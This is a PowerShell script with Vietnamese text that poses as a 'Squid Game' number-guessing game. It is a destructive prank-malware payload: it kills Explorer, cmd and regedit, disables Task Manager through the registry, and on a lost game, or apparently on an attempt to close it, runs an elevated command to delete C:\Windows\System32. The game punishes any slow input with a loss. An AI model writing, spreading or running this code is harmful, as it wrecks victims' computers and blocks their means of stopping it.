Add-Type -TypeDefinition @"
using System;
using System.Windows.Forms;
public class MsgBox {
    public static void Show(string text, string caption) {
        MessageBox.Show(text, caption, MessageBoxButtons.OK, MessageBoxIcon.Warning);
    }
}
"@ -Language CSharp

# Hiển thị cảnh báo
[MsgBox]::Show("Chào mừng đến với Squid Game: Đoán Số System32!`n`n- Chơi 5 trận (BO5), mỗi bên đoán số của nhau.`n- Lượt đi trước mỗi trận là ngẫu nhiên.`n- Nếu thua 3 trận, System32 RIP!`n- Không nhập trong 15 giây = Tự động thua trận đó.`n- Không thể thoát game!`n`nChúc may mắn!", "CẢNH BÁO!")

# Khóa các lối thoát
Write-Host "Khóa các lối thoát..."
Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "cmd" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "regedit" -Force -ErrorAction SilentlyContinue

# Chặn mở Task Manager
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -PropertyType DWORD -Force | Out-Null

# Chặn tắt script: Nếu bị tắt, System32 RIP
Register-ObjectEvent -InputObject (New-Object System.Timers.Timer) -EventName Disposed -Action {
    Write-Host "Bạn đã cố thoát! Xóa System32 ngay lập tức..."
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c rmdir /s /q C:\Windows\System32" -Verb RunAs
} | Out-Null

# Biến lưu số trận thắng/thua
$winCount = 0
$loseCount = 0

# Hàm lấy số nhập vào từ người chơi
function Get-PlayerNumber {
    param ($message)
    $timeout = 15
    $startTime = Get-Date
    $playerNumber = $null

    while ((New-TimeSpan -Start $startTime -End (Get-Date)).TotalSeconds -lt $timeout) {
        if ($Host.UI.RawUI.KeyAvailable) {
            $playerNumber = Read-Host $message
            break
        }
        Start-Sleep -Milliseconds 500
    }

    # Nếu không nhập kịp
    if (-not $playerNumber) {
        Write-Host "Bạn đã chậm tay! Trận này tính là thua!"
        return $null
    }

    # Kiểm tra nếu nhập không phải là số
    if (-not ($playerNumber -match "^\d+$")) {
        Write-Host "Lỗi! Bạn phải nhập một số hợp lệ. Trận này tính là thua!"
        return $null
    }

    return [int]$playerNumber
}

# Chơi 5 trận
for ($round=1; $round -le 5; $round++) {
    Write-Host "`n--- Trận $round/5 ---"

    # Random người đi trước
    $playerFirst = Get-Random -Minimum 0 -Maximum 2
    if ($playerFirst -eq 1) {
        Write-Host "Bạn đi trước!"
    } else {
        Write-Host "Windows đi trước!"
    }

    # Windows chọn số bí mật
    $windowsNumber = Get-Random -Minimum 1 -Maximum 11

    # Người chơi đoán (nếu đi trước)
    if ($playerFirst -eq 1) {
        $playerGuess = Get-PlayerNumber "Nhập số của bạn (1-10)"
        if ($playerGuess -eq $null) {
            $loseCount++
            continue
        }

        # Kiểm tra kết quả
        if (($playerGuess -ge ($windowsNumber - 2)) -and ($playerGuess -le ($windowsNumber + 2))) {
            Write-Host "✅ Bạn đã đoán gần đúng! Bạn thắng trận này!"
            $winCount++
        } else {
            Write-Host "❌ Bạn đã đoán sai! Bạn thua trận này!"
            $loseCount++
        }
    }

    # Windows đoán số của bạn
    $playerNumber = Get-PlayerNumber "Nhập một số bí mật cho Windows đoán (1-10)"
    if ($playerNumber -eq $null) {
        $loseCount++
        continue
    }

    # Windows đoán số của người chơi
    $windowsGuess = Get-Random -Minimum 1 -Maximum 11
    Write-Host "Windows đã đoán: $windowsGuess"

    if (($windowsGuess -ge ($playerNumber - 2)) -and ($windowsGuess -le ($playerNumber + 2))) {
        Write-Host "😈 Windows đoán đúng! Bạn thua trận này!"
        $loseCount++
    } else {
        Write-Host "🎉 Windows đoán sai! Bạn thắng trận này!"
        $winCount++
    }

    # Kiểm tra nếu đã thắng/thua 3 trận để kết thúc sớm
    if ($winCount -ge 3) {
        Write-Host "`n🔥 Bạn đã thắng 3 trận! System32 an toàn!"
        break
    }
    if ($loseCount -ge 3) {
        Write-Host "`n💀 Bạn đã thua 3 trận! System32 RIP!"
        break
    }
}

# Kiểm tra kết quả cuối cùng
if ($winCount -ge 3) {
    Write-Host "`n🎉 Chúc mừng! Bạn đã thắng ít nhất 3 trận! System32 vẫn an toàn!"
} else {
    Write-Host "`nBạn đã thua. Như bạn đã đọc, System32 sẽ bị xóa."
    Write-Host "Nhưng tôi cũng không phải người xấu, nên tôi sẽ cho bạn thêm 2 phút sử dụng trước khi máy tính này hoàn toàn vô dụng. Chúc may mắn."
    
    # Đếm ngược 2 phút
    for ($i=120; $i -ge 1; $i--) {
        Write-Host "`rCòn lại: $i giây" -NoNewline
        Start-Sleep -Seconds 1
    }

    # Xóa System32 sau 2 phút
    Write-Host "`nHết thời gian. Xóa System32 ngay bây giờ..."
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c rmdir /s /q C:\Windows\System32" -Verb RunAs
}

# Mở lại Explorer khi kết thúc
Start-Process explorer.exe

# Khôi phục quyền mở Task Manager
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -ErrorAction SilentlyContinue
